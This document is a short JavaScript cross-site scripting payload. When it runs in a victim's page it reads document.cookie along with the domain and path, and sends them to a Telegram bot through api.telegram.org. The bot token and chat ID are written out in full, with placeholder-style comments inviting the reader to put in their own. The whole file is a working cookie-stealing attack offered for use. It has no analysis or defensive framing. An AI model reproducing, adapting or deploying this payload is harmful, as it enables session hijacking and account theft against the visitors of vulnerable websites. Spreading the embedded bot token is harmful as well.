var tokenBot = '6299530694:AAGQ4i4FThkwbr51cZZnL-Pt69uYa8EiW98'; // Your "tokenBot" Here
var chatId = '480631913'; // Your "chatId" Here

function telegramSend(tokenBot, chatId) {
	var textData = '**XSS+Alert+in+**' + document['domain']+'%0d%0a------------------------------------------------%0d%0a%0d%0a**-+URL+Target+-**%0d%0a**' + document['location']['hostname'] + document['location']['pathname'] + '**%0d%0a%0d%0a**-+Document+Cookie+-</b>%0d%0a**' + document['cookie'] + '**';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
